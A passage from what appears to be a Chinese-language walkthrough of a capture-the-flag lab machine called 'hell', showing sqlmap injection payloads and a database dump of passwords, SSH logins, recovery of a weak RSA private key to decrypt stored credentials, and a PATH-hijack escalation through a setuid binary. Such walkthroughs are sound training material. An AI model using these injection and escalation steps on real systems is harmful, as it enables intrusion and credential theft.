[09:35:13] [INFO] testing '</span>MySQL inline queries<span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 stacked queries<span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>query SLEEP - comment<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">&lt;</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>BENCHMARK - comment<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">&lt;</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>BENCHMARK<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:35:23] [INFO] GET parameter '</span><span class="token function">id</span><span class="token string">' appears to be '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">' injectable 
[09:35:23] [INFO] testing '</span>Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">20</span> columns<span class="token string">'
[09:35:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:35:23] [INFO] '</span>ORDER BY<span class="token string">' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:35:23] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
[09:35:23] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '</span>--dbms<span class="token operator">=</span>mysql<span class="token string">') 
[09:35:24] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">20</span> columns<span class="token string">'
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">21</span> to <span class="token number">40</span> columns<span class="token string">'
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">41</span> to <span class="token number">60</span> columns<span class="token string">'
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">61</span> to <span class="token number">80</span> columns<span class="token string">'
[09:35:24] [INFO] testing '</span>MySQL UNION query <span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> - <span class="token number">81</span> to <span class="token number">100</span> columns<span class="token string">'
[09:35:24] [INFO] checking if the injection point on GET parameter '</span><span class="token function">id</span><span class="token string">' is a false positive
GET parameter '</span><span class="token function">id</span><span class="token string">' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 221 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1'</span> AND <span class="token assign-left variable">4156</span><span class="token operator">=</span><span class="token number">4156</span> AND <span class="token string">'svBS'</span><span class="token operator">=</span><span class="token string">'svBS

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1'</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">5758</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>jvcJ<span class="token punctuation">)</span> AND <span class="token string">'IDpr'</span><span class="token operator">=</span><span class="token string">'IDpr
---
[09:35:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:35:24] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 156 times
[09:35:24] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/172.17.0.3'

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 09:35:24 /2024-07-17/</code></pre>
<p>确实存在sql注入,搜集信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://172.17.0.3/admin/index.php?id=1"</span> <span class="token parameter variable">--proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:10088"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">--dbs</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> creds
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> example
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://172.17.0.3/admin/index.php?id=1"</span> <span class="token parameter variable">--proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:10088"</span> <span class="token parameter variable">--batch</span> <span class="token parameter variable">-D</span> creds <span class="token parameter variable">--tables</span>
<span class="token function">users</span></code></pre>
<pre class="language-zsh" data-language="zsh"><code class="language-zsh">&gt; sqlmap -u &quot;http:&#x2F;&#x2F;172.17.0.3&#x2F;admin&#x2F;index.php?id&#x3D;1&quot; --proxy&#x3D;&quot;socks5:&#x2F;&#x2F;127.0.0.1:10088&quot; --batch -D creds -T users --dump
+-------------------+----------+
| password          | username |
+-------------------+----------+
| beltran48         | marco    |
| iamoswe2023!      | txhaka   |
| superrootpassword | root     |
+-------------------+----------+</code></pre>
<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h2><p>拿到三组用户名，登了一下发现只有<code>txhaka</code>可以登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> proxychains <span class="token function">ssh</span> txhaka@172.17.0.3                                                                                                             
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">127.0</span>.0.1:10088  <span class="token punctuation">..</span>.  <span class="token number">172.17</span>.0.3:22  <span class="token punctuation">..</span>.  OK
The authenticity of <span class="token function">host</span> <span class="token string">'172.17.0.3 (172.17.0.3)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:MclgaIFcKHnKBJxp/4+QZYCN7VmpZu/Qt2QEvqYriNo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">172.17</span>.0.3<span class="token string">' (ED25519) to the list of known hosts.
txhaka@172.17.0.3'</span>s password: 
Welcome to Ubuntu <span class="token number">22.04</span>.1 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.15</span>.0-60-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that <span class="token function">users</span> <span class="token keyword">do</span> not log into.

To restore this content, you can run the <span class="token string">'unminimize'</span> command.
Last login: Thu Feb <span class="token number">16</span> 02:49:04 <span class="token number">2023</span> from <span class="token number">172.17</span>.0.1
txhaka@a3e5e05c03c8:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>txhaka<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>txhaka<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>txhaka<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">txhaka@a3e5e05c03c8:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwxr-x--- <span class="token number">1</span> txhaka txhaka <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root   <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> txhaka txhaka   <span class="token number">73</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> txhaka txhaka  <span class="token number">220</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> txhaka txhaka <span class="token number">3771</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bashrc
drwx------ <span class="token number">2</span> txhaka txhaka <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .cache
-rw-r--r-- <span class="token number">1</span> txhaka txhaka  <span class="token number">807</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .profile
-r-------- <span class="token number">1</span> txhaka txhaka  <span class="token number">288</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
txhaka@a3e5e05c03c8:~$ <span class="token function">cat</span> flag.txt 

█▀ █▀█ █   █   █▄▄ █▀█ █▀█ █   █▀▀ ▄▀█ █▄ █
▄█ ▀▀█ █▄▄ █   █▄█ █▄█ █▄█ █▄▄ ██▄ █▀█ █ ▀█

Flag <span class="token number">5</span>: HELL<span class="token punctuation">&#123;</span>7H3_B00L34N_15_4150_4_VU1N<span class="token punctuation">&#125;</span></code></pre>
<p>拿到flag5说明一切正常，用sql注入得到的密码登录root登录成功，原来root没有配ssh</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">txhaka@a3e5e05c03c8:/home$ <span class="token function">su</span> 
Password: 
root@a3e5e05c03c8:/home<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@a3e5e05c03c8:~<span class="token comment"># ls -al</span>
total <span class="token number">40</span>
drwx------ <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root root <span class="token number">4096</span> Jul <span class="token number">17</span> 00:53 <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> root root   <span class="token number">52</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">3106</span> Oct <span class="token number">15</span>  <span class="token number">2021</span> .bashrc
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .local
-rw------- <span class="token number">1</span> root root <span class="token number">1321</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .mysql_history
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
drwxr-xr-x <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> creds
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">273</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">132</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> message.txt
root@a3e5e05c03c8:~<span class="token comment"># cat flag.txt </span>

█▀█ █▀█ █▀█ ▀█▀         ▄▀█ █▀▀ ▄▀█ █ █▄ █
█▀▄ █▄█ █▄█  █  ▄ ▄ ▄   █▀█ █▄█ █▀█ █ █ ▀█

Flag <span class="token number">6</span>: HELL<span class="token punctuation">&#123;</span>7H3_5QL1_15_7H3_K3Y<span class="token punctuation">&#125;</span></code></pre>
<p>拿到flag6，读一下message</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@a3e5e05c03c8:~<span class="token comment"># cat message.txt </span>

From: pascualropi@hell.h4u

Hi, I have left <span class="token function">ssh</span> credentials <span class="token keyword">in</span> the .enc file, remember to decrypt it with your private rsa key <span class="token builtin class-name">:</span><span class="token punctuation">)</span></code></pre>
<p>看起来像是解密rsa</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@a3e5e05c03c8:~<span class="token comment"># cd creds</span>
root@a3e5e05c03c8:~/creds<span class="token comment"># ls -al</span>
total <span class="token number">16</span>
drwxr-xr-x <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwx------ <span class="token number">1</span> root root <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">129</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> creds.enc
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">451</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> public.crt</code></pre>
<p>先提取出来公钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> python3 RsaCtfTool.py <span class="token parameter variable">--dumpkey</span> <span class="token parameter variable">--key</span> <span class="token punctuation">..</span>/public.crt 
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Using native python functions <span class="token keyword">for</span> math, <span class="token function">which</span> is slow. <span class="token function">install</span> gmpy2 with: <span class="token string">'python3 -m pip install &lt;module>'</span><span class="token builtin class-name">.</span>
private argument is not set, the private key will not be displayed, even <span class="token keyword">if</span> recovered.
None
n: <span class="token number">279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517</span>
e: <span class="token number">115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png" alt="ORkSMK.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/07/17/ORxz9b.png" alt="ORxz9b.png" loading="lazy"><br>n能分解我是没想到的,直接构建私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">from Crypto.PublicKey <span class="token function">import</span> RSA
from gmpy2 <span class="token function">import</span> *
<span class="token assign-left variable">n</span><span class="token operator">=</span><span class="token number">279385031788393610858518717453056412444145495766410875686980235557742299199283546857513839333930590575663488845198789276666170586375899922998595095471683002939080133549133889553219070283957020528434872654142950289279547457733798902426768025806617712953244255251183937835355856887579737717734226688732856105517</span>
<span class="token assign-left variable">e</span><span class="token operator">=</span><span class="token number">115728201506489397643589591830500007746878464402967704982363700915688393155096410811047118175765086121588434953079310523301854568599734584654768149408899986656923460781694820228958486051062289463159083249451765181542090541790670495984616833698973258382485825161532243684668955906382399758900023843171772758139</span>
<span class="token assign-left variable">p</span><span class="token operator">=</span><span class="token number">13833273097933021985630468334687187177001607666479238521775648656526441488361370235548415506716907370813187548915118647319766004327241150104265530014047083</span>
<span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">20196596265430451980613413306694721666228452787816468878984356787652099472230934129158246711299695135541067207646281901620878148034692171475252446937792199</span>
<span class="token assign-left variable">phi</span><span class="token operator">=</span><span class="token punctuation">(</span>p-1<span class="token punctuation">)</span>*<span class="token punctuation">(</span>q-1<span class="token punctuation">)</span>
<span class="token assign-left variable">d</span><span class="token operator">=</span>int<span class="token punctuation">(</span>gmpy2.invert<span class="token punctuation">(</span>e,phi<span class="token punctuation">))</span>
key <span class="token operator">=</span> RSA.construct<span class="token variable"><span class="token punctuation">((</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">))</span></span>
print<span class="token punctuation">(</span>key.exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span>.decode<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur
bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
-----END RSA PRIVATE KEY-----</code></pre>
<p>解密一下文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>  openssl pkeyutl <span class="token parameter variable">-decrypt</span> <span class="token parameter variable">-inkey</span> aaa  <span class="token parameter variable">-in</span> creds.enc

Credentials <span class="token keyword">for</span> <span class="token for-or-select variable">ssh</span> <span class="token keyword">in</span> hell:

Username: pascual
Password: vulnwhatsapp123<span class="token operator">!</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> pascual@192.168.56.199  
The authenticity of <span class="token function">host</span> <span class="token string">'192.168.56.199 (192.168.56.199)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:aUSoZyYPezlPKdiG/TOw1clwpRm5PrR4RkQxZSy7JnE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">192.168</span>.56.199<span class="token string">' (ED25519) to the list of known hosts.
pascual@192.168.56.199'</span>s password: 
Welcome to Ubuntu <span class="token number">22.04</span>.1 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.15</span>.0-60-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that <span class="token function">users</span> <span class="token keyword">do</span> not log into.

To restore this content, you can run the <span class="token string">'unminimize'</span> command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Thu Feb <span class="token number">16</span> 07:33:38 <span class="token number">2023</span> from <span class="token number">192.168</span>.193.129
pascual@hell:~$ </code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-x--- <span class="token number">5</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">7</span> root    root    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> pascual pascual  <span class="token number">295</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history
-rw-r--r-- <span class="token number">1</span> pascual pascual  <span class="token number">220</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> pascual pascual <span class="token number">3771</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bashrc
drwx------ <span class="token number">2</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .cache
drwxrwxr-x <span class="token number">3</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> pascual pascual  <span class="token number">807</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .profile
drwxrwxr-x <span class="token number">2</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .ssh
-r-------- <span class="token number">1</span> pascual pascual  <span class="token number">275</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
pascual@hell:~$ <span class="token function">cat</span> flag.txt 

█▀█ ▄▀█ █▀ █▀▀ █ █ ▄▀█ █   █▀█ █▀█ █▀█ █
█▀▀ █▀█ ▄█ █▄▄ █▄█ █▀█ █▄▄ █▀▄ █▄█ █▀▀ █

Flag <span class="token number">7</span>: HELL<span class="token punctuation">&#123;</span>R54C7F7001_OR_M4NU41?<span class="token punctuation">&#125;</span></code></pre>
<p>拿到第七个flag</p>
<h2 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h2><pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">28</span>
drwxr-xr-x  <span class="token number">7</span> root    root    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">19</span> root    root    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwxr-x---  <span class="token number">6</span> eddie   eddie   <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> eddie
drwxr-x---  <span class="token number">6</span> gato    gato    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> gato
drwxr-x---  <span class="token number">5</span> ghost   ghost   <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> ghost
drwxr-x---  <span class="token number">5</span> pascual pascual <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> pascual
drwxr-x---  <span class="token number">3</span> run     run     <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> run</code></pre>
<p>home下好多人，不过都没权限看，一般user多先看一眼邮箱</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:/var/mail$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">16</span>
drwxrwsr-x  <span class="token number">2</span> root    mail    <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">14</span> root    root    <span class="token number">4096</span> Feb <span class="token number">15</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-r--------  <span class="token number">1</span> eddie   eddie    <span class="token number">142</span> Feb <span class="token number">15</span>  <span class="token number">2023</span> eddie
-r--------  <span class="token number">1</span> pascual pascual  <span class="token number">166</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> pascual
pascual@hell:/var/mail$ <span class="token function">cat</span> pascual 

From: eddiedota@hell.h4u

I have created a reports binary <span class="token keyword">in</span> /opt/reports/reports with <span class="token function">which</span> you can <span class="token builtin class-name">read</span> the reports by passing an identifier as an argumen</code></pre>
<p>看一下这个文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:/opt/reports$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">24</span>
drwx------ <span class="token number">2</span> pascual pascual  <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">5</span> root    root     <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
-rwsr-xr-x <span class="token number">1</span> eddie   eddie   <span class="token number">16208</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> reports</code></pre>
<p>通过base64传到kali，反编译看一下<br><img src="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png" alt="ORkSMK.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/07/17/ORxz9b.png" alt="ORxz9b.png" loading="lazy"><img src="https://ooo.0x0.ooo/2024/07/17/ORzm26.png" alt="ORzm26.png" loading="lazy"></p>
<p>可以看到这个cat是用的环境变量，所以可以使用环境变量劫持</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pascual@hell:/opt/reports$ <span class="token builtin class-name">cd</span> /tmp
pascual@hell:/tmp$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PWD</span><span class="token builtin class-name">:</span><span class="token environment constant">$PATH</span>
pascual@hell:/tmp$ <span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">></span>cat
pascual@hell:/tmp$ <span class="token function">chmod</span> +x <span class="token function">cat</span>
pascual@hell:/tmp$ /opt/reports/reports <span class="token number">0</span>

eddie@hell:/tmp$ </code></pre>
<p>把环境变量修复一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">eddie@hell:~$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games
eddie@hell:/home/eddie$ <span class="token builtin class-name">cd</span> ~
eddie@hell:~$ <span class="token builtin class-name">cd</span> /home/eddie
eddie@hell:/home/eddie$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-x--- <span class="token number">6</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">7</span> root  root  <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root  root     <span class="token number">9</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> eddie eddie  <span class="token number">220</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> eddie eddie <span class="token number">3771</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .bashrc
drwx------ <span class="token number">2</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .cache
drwxrwxr-x <span class="token number">3</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> eddie eddie  <span class="token number">807</span> Jan  <span class="token number">6</span>  <span class="token number">2022</span> .profile
drwxrwxr-x <span class="token number">2</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> .ssh
-r-------- <span class="token number">1</span> eddie eddie  <span class="token number">238</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
drwxrwxr-x <span class="token number">2</span> eddie eddie <span class="token number">4096</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> report
eddie@hell:/home/eddie$ <span class="token function">cat</span> flag.txt

█▀▀ █▀▄ █▀▄ █ █▀▀ █▀▄ █▀█ ▀█▀ ▄▀█
██▄ █▄▀ █▄▀ █ ██▄ █▄▀ █▄█  █  █▀█

Flag <span class="token number">8</span>: HELL<span class="token punctuation">&#123;</span>R3L4T1V3_R0U735_4R3_FUN<span class="token operator">!</span><span class="token punctuation">&#125;</span></code></pre>
<p>拿到第八个flag<br>继续读剩下的一个邮件</p>
